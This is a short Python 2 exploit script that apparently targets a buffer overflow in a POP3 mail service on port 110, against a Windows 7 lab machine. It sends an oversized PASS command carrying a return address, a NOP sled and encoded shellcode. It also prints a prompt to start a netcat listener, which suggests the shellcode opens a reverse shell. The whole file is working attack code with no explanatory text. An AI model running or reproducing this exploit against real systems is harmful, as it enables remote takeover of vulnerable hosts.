#!/usr/bin/python
import socket
import sys

WINDOWS7_MACHINE_IP = '172.16.44.129'

shell_code = "\xb8\xbd\x2e\x91\xba\xdb\xcd\xd9\x74\x24\xf4\x5b\x31\xc9\xb1"
shell_code += "\x52\x31\x43\x12\x03\x43\x12\x83\x56\xd2\x73\x4f\x54\xc3\xf6"
shell_code += "\xb0\xa4\x14\x97\x39\x41\x25\x97\x5e\x02\x16\x27\x14\x46\x9b"
shell_code += "\xcc\x78\x72\x28\xa0\x54\x75\x99\x0f\x83\xb8\x1a\x23\xf7\xdb"
shell_code += "\x98\x3e\x24\x3b\xa0\xf0\x39\x3a\xe5\xed\xb0\x6e\xbe\x7a\x66"
shell_code += "\x9e\xcb\x37\xbb\x15\x87\xd6\xbb\xca\x50\xd8\xea\x5d\xea\x83"
shell_code += "\x2c\x5c\x3f\xb8\x64\x46\x5c\x85\x3f\xfd\x96\x71\xbe\xd7\xe6"
shell_code += "\x7a\x6d\x16\xc7\x88\x6f\x5f\xe0\x72\x1a\xa9\x12\x0e\x1d\x6e"
shell_code += "\x68\xd4\xa8\x74\xca\x9f\x0b\x50\xea\x4c\xcd\x13\xe0\x39\x99"
shell_code += "\x7b\xe5\xbc\x4e\xf0\x11\x34\x71\xd6\x93\x0e\x56\xf2\xf8\xd5"
shell_code += "\xf7\xa3\xa4\xb8\x08\xb3\x06\x64\xad\xb8\xab\x71\xdc\xe3\xa3"
shell_code += "\xb6\xed\x1b\x34\xd1\x66\x68\x06\x7e\xdd\xe6\x2a\xf7\xfb\xf1"
shell_code += "\x4d\x22\xbb\x6d\xb0\xcd\xbc\xa4\x77\x99\xec\xde\x5e\xa2\x66"
shell_code += "\x1e\x5e\x77\x28\x4e\xf0\x28\x89\x3e\xb0\x98\x61\x54\x3f\xc6"
shell_code += "\x92\x57\x95\x6f\x38\xa2\x7e\x3c\xad\x80\x7f\x54\xcc\xd8\x7b"
shell_code += "\x76\x59\x3e\xe9\x66\x0c\xe9\x86\x1f\x15\x61\x36\xdf\x83\x0c"
shell_code += "\x78\x6b\x20\xf1\x37\x9c\x4d\xe1\xa0\x6c\x18\x5b\x66\x72\xb6"
shell_code += "\xf3\xe4\xe1\x5d\x03\x62\x1a\xca\x54\x23\xec\x03\x30\xd9\x57"
shell_code += "\xba\x26\x20\x01\x85\xe2\xff\xf2\x08\xeb\x72\x4e\x2f\xfb\x4a"
shell_code += "\x4f\x6b\xaf\x02\x06\x25\x19\xe5\xf0\x87\xf3\xbf\xaf\x41\x93"
shell_code += "\x46\x9c\x51\xe5\x46\xc9\x27\x09\xf6\xa4\x71\x36\x37\x21\x76"
shell_code += "\x4f\x25\xd1\x79\x9a\xed\xe1\x33\x86\x44\x6a\x9a\x53\xd5\xf7"
shell_code += "\x1d\x8e\x1a\x0e\x9e\x3a\xe3\xf5\xbe\x4f\xe6\xb2\x78\xbc\x9a"
shell_code += "\xab\xec\xc2\x09\xcb\x24"

buffer = 'A' * 2606 + '\x8F\x35\x4A\x5F' + '\x90' * 16 + shell_code 

print "Set a listener with 'nc -vlp 1234' and press any key to continue.."

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect((WINDOWS7_MACHINE_IP, 110))
s.recv(1024)
s.send('USER Elliyahu \r\n')
s.recv(1024)
s.send('PASS ' + buffer + '\r\n')
s.send('QUIT\r\n')
s.close()

